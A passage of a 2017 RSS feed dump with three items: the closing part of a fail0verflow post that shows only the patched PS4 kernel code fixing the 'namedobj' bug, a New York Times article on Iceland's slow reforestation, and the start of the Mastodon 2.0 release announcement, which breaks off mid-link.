&lt;p&gt;The namedobj exploit was present and exploitable (albeit using a slightly different method than described here) until it was fixed in firmware version 4.06. This vulnerability was also found and exploited by (at least) &lt;a href=&quot;https://www.youtube.com/watch?v=KLkKql31d44&quot;&gt;Chaitin Tech&lt;/a&gt;, so props to them! Taking a quick look at the 4.07 kernel, we can see a straightforward fix (4.06 is assumed to be identical - only had 4.07 on hand while writing this post):&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sys_namedobj_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ... (unchanged)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And so we say goodbye to a nice exploit.&lt;/p&gt;
&lt;p&gt;I hope you enjoyed this blast from the past :)&lt;br/&gt;Keep hacking!&lt;/p&gt;
</description>
<pubDate>Fri, 20 Oct 2017 13:39:06 +0000</pubDate>
<dc:creator>Aissen</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/</dc:identifier>
</item>
<item>
<title>Iceland&amp;#039;s attempts to replant its forests</title>
<link>https://www.nytimes.com/interactive/2017/10/20/climate/iceland-trees-reforestation.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/interactive/2017/10/20/climate/iceland-trees-reforestation.html</guid>
<description>&lt;p class=&quot;paragraph&quot;&gt;GUNNARSHOLT, Iceland — With his flats of saplings and a red planting tool, Jon Asgeir Jonsson is a foot soldier in the fight to reforest Iceland, working to bring new life to largely barren landscapes.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;The country lost most of its trees more than a thousand years ago, when Viking settlers took their axes to the forests that covered one-quarter of the countryside. Now Icelanders would like to get some of those forests back, to improve and stabilize the country’s harsh soils, help agriculture and fight climate change.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;But restoring even a portion of Iceland’s once-vast forests is a slow and seemingly endless task. Despite the planting of three million or more trees in recent years, the amount of land that is covered in forest — estimated at about 1 percent at the turn of the 20th century, when reforestation was made a priority — has barely increased.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;“It’s definitely a struggle,” said Mr. Jonsson, a forester who works for the private Icelandic Forestry Association and plants saplings with volunteers from the many local forestry groups in this island nation of 350,000 people. “We have gained maybe half a percent in the last century.”&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Even in a small country like Iceland, a few million trees a year is just a drop in the bucket.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Iceland’s austere, largely treeless landscapes, punctuated by vast glaciers and stark volcanoes, have long been a favorite of the film industry.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;The picturesque vistas also have helped fuel a tourism boom. Nearly 1.8 million foreigners visited the country last year.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;But with that beauty comes a problem that Icelanders have faced for centuries. The lack of trees, coupled with the ash and larger pieces of volcanic rock spewed by eruptions, has led to severe soil erosion.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;With vegetation unable to gain much of a foothold, farming and grazing have been next to impossible in many parts of the country. And the loose soil, combined with Iceland’s strong winds, has led to sandstorms that can further damage the land — and even blast the paint off cars.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;Iceland’s farmers struggled with erosion and windblown soil for centuries. But in the decades that followed a particularly destructive sandstorm east of the capital, Reykjavik, in 1882, the government established reforestation and soil conservation efforts.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Reforesting more of the Icelandic countryside would have benefits beyond helping farmers and stopping sandstorms. As climate change has become a greater concern, Iceland’s leaders have viewed reforestation as a way to help the country meet its climate goals.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Despite the widespread use of geothermal energy and hydropower, Iceland has high per-capita emissions of greenhouse gases, largely because of transportation and heavy industries like aluminum smelting. The government is working with the European Union and Norway to meet an overall goal of a 40 percent emissions reduction from 1990 levels by 2030. Separately, Iceland has its own target of a reduction between 50 percent and 75 percent by 2050.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Trees, by incorporating atmospheric carbon dioxide into their trunks, roots and other tissues, can offset some of the country’s emissions.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;“An important contributor to Iceland’s mitigation policy is planting trees,” said Gudmundur Halldorsson, research coordinator of the Soil Conservation Service of Iceland. “It is a big discussion here.”&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;But as Mr. Jonsson’s work shows, once the trees are gone, it’s no easy task to bring them back.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;When Iceland was first settled at the end of the ninth century, much of the land on or near the coast was covered in birch woodlands.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;“The people that came here were Iron Age culture,” Dr. Halldorsson said. “And they did what Iron Age culture did.”&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;The settlers slashed and burned the forests to grow hay and barley, and to create grazing land. They used the timber for building and for charcoal for their forges. By most accounts, the island was largely deforested within three centuries.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;“They removed the pillar out of the ecosystem,” Dr. Halldorsson said.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Eruptions over the ensuing centuries from some of Iceland’s many volcanoes deposited thick layers of volcanic material. The ash, while rich in nutrients, made for very fragile, poor soil that couldn’t hold water and moved around as the wind blew.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;As a result, Iceland is a case study in desertification, with little or no vegetation, though the problem is not heat or drought. About 40 percent of the country is desert, Dr. Halldorsson said. “But there’s plenty of rainfall — we call it ‘wet desert.’” The situation is so bad that students from countries that are undergoing desertification come here to study the process.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;Dr. Halldorsson’s office is at Gunnarsholt, site of one of Iceland’s oldest farmsteads, 60 miles east of Reykjavik and not far from one of the country’s largest volcanoes, Hekla.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;In the huge sandstorm of 1882, the farm and much of the surrounding area was buried. Over nearly two weeks, the blowing sand scoured the land and destroyed all the vegetation. Hundreds of sheep died, their wool so weighed down with sand that they could not reach shelter. A nearby lake was completely filled in; farmers found trout lying on the top of the sand once the storm was over.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;“Simply everything was stripped away,” Dr. Halldorsson said. “This is what people don’t realize. You can lose something like this in relatively few years.”&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;The soil conservation service took over the farm in the 1920s and has used it as an outdoor laboratory to study ways to improve the soil and enable vegetation to grow. The process usually begins with lyme grass, which grows quickly and can stabilize the soil. Lupine, with its spiky purple flowers, is often next. The trees come later.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;The work of planting saplings usually begins with an evaluation of the particular site. For Mr. Jonsson of the forestry association, that means looking at what vegetation is already growing there. “You can estimate the richness of the soil underneath,” he said.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Mr. Jonsson and his volunteers then plant the appropriate species for the plot — birch, Sitka spruce, lodgepole pine, Russian larch or other species. “We’d love to plant aspen,” he said. “But sheep really love aspen.”&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;For Saemundur Thorvaldsson, a government forester who works with volunteer groups and farmers in the Westfjords region of northern Iceland, the “right” tree about 30 percent of the time is birch, the same species that was dominant when Iceland was settled. Birch can tolerate poor soils, and although it grows very slowly it eventually provides shelter for other species.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;Most of those other species — Sitka spruce, lodgepole pine, black cottonwood — originated in Alaska. They are now grown as saplings at greenhouses in Iceland, because importing live trees is prohibited.&lt;/p&gt;
&lt;div class=&quot;g-slideshow ss-100000005498983&quot;&gt;
&lt;div class=&quot;g-slideshow-item image&quot; data-id=&quot;100000005498975&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;g-asset-wrapper&quot;&gt;&lt;img class=&quot;g-lazy&quot; src=&quot;https://static01.nyt.com/images/2017/10/17/climate/00iceland-greenhouse2/merlin-to-scoop-126603932-196119-master180.jpg&quot; data-safe-area=&quot;{&amp;quot;top&amp;quot;:0,&amp;quot;right&amp;quot;:0,&amp;quot;bottom&amp;quot;:0,&amp;quot;left&amp;quot;:0}&quot; data-pattern=&quot;https://static01.nyt.com/images/2017/10/17/climate/00iceland-greenhouse2/merlin-to-scoop-126603932-196119-{{size}}.jpg&quot; data-widths=&quot;[{&amp;quot;slug&amp;quot;:&amp;quot;master180&amp;quot;,&amp;quot;size&amp;quot;:180},{&amp;quot;slug&amp;quot;:&amp;quot;blog225&amp;quot;,&amp;quot;size&amp;quot;:225},{&amp;quot;slug&amp;quot;:&amp;quot;tmagSF&amp;quot;,&amp;quot;size&amp;quot;:362},{&amp;quot;slug&amp;quot;:&amp;quot;blog427&amp;quot;,&amp;quot;size&amp;quot;:427},{&amp;quot;slug&amp;quot;:&amp;quot;blog480&amp;quot;,&amp;quot;size&amp;quot;:480},{&amp;quot;slug&amp;quot;:&amp;quot;master495&amp;quot;,&amp;quot;size&amp;quot;:495},{&amp;quot;slug&amp;quot;:&amp;quot;blog533&amp;quot;,&amp;quot;size&amp;quot;:533},{&amp;quot;slug&amp;quot;:&amp;quot;tmagArticle&amp;quot;,&amp;quot;size&amp;quot;:592},{&amp;quot;slug&amp;quot;:&amp;quot;articleLarge&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;slide&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;popup&amp;quot;,&amp;quot;size&amp;quot;:650},{&amp;quot;slug&amp;quot;:&amp;quot;master675&amp;quot;,&amp;quot;size&amp;quot;:675},{&amp;quot;slug&amp;quot;:&amp;quot;jumbo&amp;quot;,&amp;quot;size&amp;quot;:1024},{&amp;quot;slug&amp;quot;:&amp;quot;master1050&amp;quot;,&amp;quot;size&amp;quot;:1050},{&amp;quot;slug&amp;quot;:&amp;quot;superJumbo&amp;quot;,&amp;quot;size&amp;quot;:2048}]&quot; data-height-multiplier=&quot;0.6666666666666666&quot; data-ratio=&quot;0.6666666666666666&quot; itemprop=&quot;url&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;caption&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span class=&quot;caption-text&quot;&gt;New trees for the Icelandic forestry service at a greenhouse just outside Egilsstadir.&lt;/span&gt; &lt;span class=&quot;credit&quot; itemprop=&quot;copyrightHolder&quot;&gt;Josh Haner/The New York Times&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;g-slideshow-item image&quot; data-id=&quot;100000005498977&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;g-asset-wrapper&quot;&gt;&lt;img class=&quot;g-lazy&quot; src=&quot;https://static01.nyt.com/images/2017/10/16/climate/merlin-to-scoop-126603872-643250/merlin-to-scoop-126603872-643250-master180.jpg&quot; data-safe-area=&quot;{&amp;quot;top&amp;quot;:0,&amp;quot;right&amp;quot;:0,&amp;quot;bottom&amp;quot;:0,&amp;quot;left&amp;quot;:0}&quot; data-pattern=&quot;https://static01.nyt.com/images/2017/10/16/climate/merlin-to-scoop-126603872-643250/merlin-to-scoop-126603872-643250-{{size}}.jpg&quot; data-widths=&quot;[{&amp;quot;slug&amp;quot;:&amp;quot;master180&amp;quot;,&amp;quot;size&amp;quot;:180},{&amp;quot;slug&amp;quot;:&amp;quot;blog225&amp;quot;,&amp;quot;size&amp;quot;:225},{&amp;quot;slug&amp;quot;:&amp;quot;tmagSF&amp;quot;,&amp;quot;size&amp;quot;:362},{&amp;quot;slug&amp;quot;:&amp;quot;blog427&amp;quot;,&amp;quot;size&amp;quot;:427},{&amp;quot;slug&amp;quot;:&amp;quot;blog480&amp;quot;,&amp;quot;size&amp;quot;:480},{&amp;quot;slug&amp;quot;:&amp;quot;master495&amp;quot;,&amp;quot;size&amp;quot;:495},{&amp;quot;slug&amp;quot;:&amp;quot;blog533&amp;quot;,&amp;quot;size&amp;quot;:533},{&amp;quot;slug&amp;quot;:&amp;quot;tmagArticle&amp;quot;,&amp;quot;size&amp;quot;:592},{&amp;quot;slug&amp;quot;:&amp;quot;articleLarge&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;slide&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;popup&amp;quot;,&amp;quot;size&amp;quot;:650},{&amp;quot;slug&amp;quot;:&amp;quot;master675&amp;quot;,&amp;quot;size&amp;quot;:675},{&amp;quot;slug&amp;quot;:&amp;quot;jumbo&amp;quot;,&amp;quot;size&amp;quot;:1024},{&amp;quot;slug&amp;quot;:&amp;quot;master1050&amp;quot;,&amp;quot;size&amp;quot;:1050},{&amp;quot;slug&amp;quot;:&amp;quot;superJumbo&amp;quot;,&amp;quot;size&amp;quot;:2048}]&quot; data-height-multiplier=&quot;0.6666666666666666&quot; data-ratio=&quot;0.6666666666666666&quot; itemprop=&quot;url&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;caption&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span class=&quot;caption-text&quot;&gt;Birch seedlings near Egilsstadir.&lt;/span&gt; &lt;span class=&quot;credit&quot; itemprop=&quot;copyrightHolder&quot;&gt;Josh Haner/The New York Times&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;g-slideshow-item image&quot; data-id=&quot;100000005498983&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;g-asset-wrapper&quot;&gt;&lt;img class=&quot;g-lazy&quot; src=&quot;https://static01.nyt.com/images/2017/10/16/climate/merlin-to-scoop-126604307-911012/merlin-to-scoop-126604307-911012-master180.jpg&quot; data-safe-area=&quot;{&amp;quot;top&amp;quot;:0,&amp;quot;right&amp;quot;:0,&amp;quot;bottom&amp;quot;:0,&amp;quot;left&amp;quot;:0}&quot; data-pattern=&quot;https://static01.nyt.com/images/2017/10/16/climate/merlin-to-scoop-126604307-911012/merlin-to-scoop-126604307-911012-{{size}}.jpg&quot; data-widths=&quot;[{&amp;quot;slug&amp;quot;:&amp;quot;master180&amp;quot;,&amp;quot;size&amp;quot;:180},{&amp;quot;slug&amp;quot;:&amp;quot;blog225&amp;quot;,&amp;quot;size&amp;quot;:225},{&amp;quot;slug&amp;quot;:&amp;quot;tmagSF&amp;quot;,&amp;quot;size&amp;quot;:362},{&amp;quot;slug&amp;quot;:&amp;quot;blog427&amp;quot;,&amp;quot;size&amp;quot;:427},{&amp;quot;slug&amp;quot;:&amp;quot;blog480&amp;quot;,&amp;quot;size&amp;quot;:480},{&amp;quot;slug&amp;quot;:&amp;quot;master495&amp;quot;,&amp;quot;size&amp;quot;:495},{&amp;quot;slug&amp;quot;:&amp;quot;blog533&amp;quot;,&amp;quot;size&amp;quot;:533},{&amp;quot;slug&amp;quot;:&amp;quot;tmagArticle&amp;quot;,&amp;quot;size&amp;quot;:592},{&amp;quot;slug&amp;quot;:&amp;quot;articleLarge&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;slide&amp;quot;,&amp;quot;size&amp;quot;:600},{&amp;quot;slug&amp;quot;:&amp;quot;popup&amp;quot;,&amp;quot;size&amp;quot;:650},{&amp;quot;slug&amp;quot;:&amp;quot;master675&amp;quot;,&amp;quot;size&amp;quot;:675},{&amp;quot;slug&amp;quot;:&amp;quot;jumbo&amp;quot;,&amp;quot;size&amp;quot;:1024},{&amp;quot;slug&amp;quot;:&amp;quot;master1050&amp;quot;,&amp;quot;size&amp;quot;:1050},{&amp;quot;slug&amp;quot;:&amp;quot;superJumbo&amp;quot;,&amp;quot;size&amp;quot;:2048}]&quot; data-height-multiplier=&quot;0.6666666666666666&quot; data-ratio=&quot;0.6666666666666666&quot; itemprop=&quot;url&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;caption&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span class=&quot;caption-text&quot;&gt;Young trees in various stages of growth at the greenhouse.&lt;/span&gt; &lt;span class=&quot;credit&quot; itemprop=&quot;copyrightHolder&quot;&gt;Josh Haner/The New York Times&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;paragraph&quot;&gt;They grow faster than birch, so as a way to store carbon they are more effective. But everything in Iceland grows slowly, Mr. Thorvaldsson said. At one forest outside Isafjordur, planted in the 1940s, spruces were perhaps 50 feet tall. In southeast Alaska they could easily reach three times that height, he said.&lt;/p&gt;

&lt;p class=&quot;paragraph&quot;&gt;No one expects that one-quarter of Iceland will ever be covered in forests again. But given slow growth rates and the enormity of the task, even more modest gains will take a long time, Mr. Thorvaldsson said.&lt;/p&gt;
&lt;p class=&quot;paragraph&quot;&gt;“The aim now is that in the next 50 years we might go up to 5 percent,” he said. “But at the speed we’re at now, it would take 150 years to do that.”&lt;/p&gt;

</description>
<pubDate>Fri, 20 Oct 2017 12:46:10 +0000</pubDate>
<dc:creator>farseer</dc:creator>
<og:url>https://www.nytimes.com/interactive/2017/10/20/climate/iceland-trees-reforestation.html</og:url>
<og:type>article</og:type>
<og:title>Vikings Razed the Forests. Can Iceland Regrow Them?</og:title>
<og:image>https://static01.nyt.com/images/2017/10/22/climate/22iceland-print/merlin-to-scoop-126602513-337561-facebookJumbo.jpg</og:image>
<og:description>The country lost most of its trees long ago. Despite years of replanting, it isn’t making much progress.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nytimes.com/interactive/2017/10/20/climate/iceland-trees-reforestation.html</dc:identifier>
</item>
<item>
<title>Mastodon 2.0</title>
<link>https://medium.com/@Gargron/mastodon-2-0-e93d9d28dbb9?</link>
<guid isPermaLink="true" >https://medium.com/@Gargron/mastodon-2-0-e93d9d28dbb9?</guid>
<description>&lt;p name=&quot;34ff&quot; id=&quot;34ff&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;About 6 months have passed since &lt;a href=&quot;https://medium.com/@Gargron/april-post-mortem-12e3d141878c&quot; data-href=&quot;https://medium.com/@Gargron/april-post-mortem-12e3d141878c&quot; class=&quot;markup--anchor markup--p-anchor&quot; target=&quot;_blank&quot;&gt;April&lt;/a&gt;, during which the major mainstream breakthrough of our decentralized social network took place. From 20,000 users to almost a million! What better time to run through a couple examples of what’s been introduced since then?&lt;/p&gt;
&lt;p name=&quot;fee7&quot; id=&quot;fee7&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Mastodon is defined by its focus on good user experience, polished design and superior anti-abuse tools. In that vein, the web app has received numerous updates. Using the latest browser features, the web app receives real push notifications, making it almost indistinguishable from a native mobile app. It works faster and looks smoother thanks to many performance and design improvements.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*6xTFy4K4JWq9nd6bXNbgmw.jpeg&quot; data-width=&quot;1280&quot; data-height=&quot;960&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*6xTFy4K4JWq9nd6bXNbgmw.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1200/1*6xTFy4K4JWq9nd6bXNbgmw.jpeg&quot;/&gt;&lt;/div&gt;
Mastodon with lots of columns pinned
&lt;p name=&quot;1c86&quot; id=&quot;1c86&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;On the desktop, it allows you to add, remove and rearrange columns. It can even be navigated and controlled using hotkeys!&lt;/p&gt;
&lt;p name=&quot;09c8&quot; id=&quot;09c8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;When you get annoyed by notifications for a toot of yours that’s gone viral, or a conversation you’ve been tagged in that you no longer have interest in, you have the ability to simply mute the whole thread. If you keep encountering content you hate and it always comes from a specific domain, but your admins won’t do anything about it (or perhaps it’s annoying, but merely on a personal level), you no longer have to rely on your admin: You can simply hide everything from a particular domain for yourself.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*CCHSuaR7daptHcIwl3J6Wg.png&quot; data-width=&quot;497&quot; data-height=&quot;341&quot; src=&quot;https://cdn-images-1.medium.com/max/1200/1*CCHSuaR7daptHcIwl3J6Wg.png&quot;/&gt;&lt;/div&gt;
One instance’s preview in Discord
&lt;p name=&quot;55d6&quot; id=&quot;55d6&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;A lot of attention has been given to how the user interface presents itself to onlookers. Both in terms of OpenGraph tags, which is to say, how links to Mastodon look when shared on other social networks or apps like Discord, and in terms of the sign-up, about, profile, toot and hashtag pages. The profile pages let you filter someone’s toots, for example to only see ones that include pictures or videos, which is a great addition for all artists and photographers. The sign up and hashtag pages do a better job of showing what’s actually inside in terms of content.&lt;/p&gt;
&lt;p name=&quot;2cbd&quot; id=&quot;2cbd&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Mastodon is a global experience. That means a lot of language diversity. Since most people don’t know most languages, language filters have been added so you can decide which ones to see.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*bTH8BapEkzwwDnchjAa6_w.png&quot; data-width=&quot;852&quot; data-height=&quot;526&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*bTH8BapEkzwwDnchjAa6_w.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1200/1*bTH8BapEkzwwDnchjAa6_w.png&quot;/&gt;&lt;/div&gt;
Custom emoji in action
&lt;p name=&quot;7e61&quot; id=&quot;7e61&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Another addition is custom emoji. That is a concept more familiar to Discord and Twitch users, but it’s a first for a social network. Custom emoji add flavours to instances and allow people to express very specific things that could never be conveyed by standardized Unicode characters.&lt;/p&gt;
&lt;p name=&quot;b8b8&quot; id=&quot;b8b8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;There are a lot of other small features and important fixes. Better logos, better icons, ongoing improvements to accessibility such as image descriptions for screen readers; upgrades to the protocol, better APIs… &lt;a href=&quot;https://github.com/tootsuite/mastodon/releases/tag/v2.0.0&quot; data-href=&quot;https://github.com/tootsuite/mastodon/releases/tag/v2.0.0&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;You can view the detailed release notes of 2.0 here&lt;/a&gt;.&lt;/p&gt;
&lt;p name=&quot;b9fc&quot; id=&quot;b9fc&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;It’s also worth mentioning that the central resource for the Mastodon project is now the &lt;a href=&quot;https://joinmastodon.org&quot; data-href=&quot;https://joinmastodon.org&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;joinMastodon.org&lt;/a&gt; website, which explains the benefits of decentralization, links to all related resources, lists the project’s sponsors, and most importantly, provides an overview of the existing network. If you want to tell someone about Mastodon, you’ve got two options now— invite them over to the instance you’re using, or link them to joinMastodon.org where they’ll pick one on their own.&lt;/p&gt;
&lt;p name=&quot;81af&quot; id=&quot;81af&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;More than ever people need an escape hatch, an alternative to commercial networks that are incentivized to keep bad actors around to drive engagement, that sell your time and screen estate to advertisers and then throw you out without recourse for saying a bad word to a celebrity. Mastodon is that hatch. It’s an alternative reality where communities know and care about each other and moderators aren’t far away from the users. Free software stands first and foremost for the freedom of its user.&lt;/p&gt;
&lt;p name=&quot;a7b3&quot; id=&quot;a7b3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;To get started with Mastodon, go to&lt;/em&gt; &lt;a href=&quot;https://joinmastodon.org/&quot; data-href=&quot;https://joinmastodon.org/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;joinMastodon.org&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;. If the choices are too overwhelming, quick recommendations of good and well-populated servers are:&lt;/em&gt; &lt;a href=&quot;https://octodon.social/about&quot; data-href=&quot;https://octodon.social/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;octodon.social&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;,&lt;/em&gt; &lt;a href=&quot;https://social.tchncs.de/about&quot; data-href=&quot;https://social.tchncs.de/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;social.tchncs.de&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;,&lt;/em&gt; &lt;a href=&quot;https://mastodon.art/about&quot; data-href=&quot;https://mastodon.art/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;mastodon.art&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;,&lt;/em&gt; &lt;a href=&quot;https://mstdn.io/about&quot; data-href=&quot;https://mstdn.io/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;mstdn.io&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;,&lt;/em&gt; &lt;a href=&quot;https://mastodon.technology/about&quot; data-href=&quot;https://mastodon.technology/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em 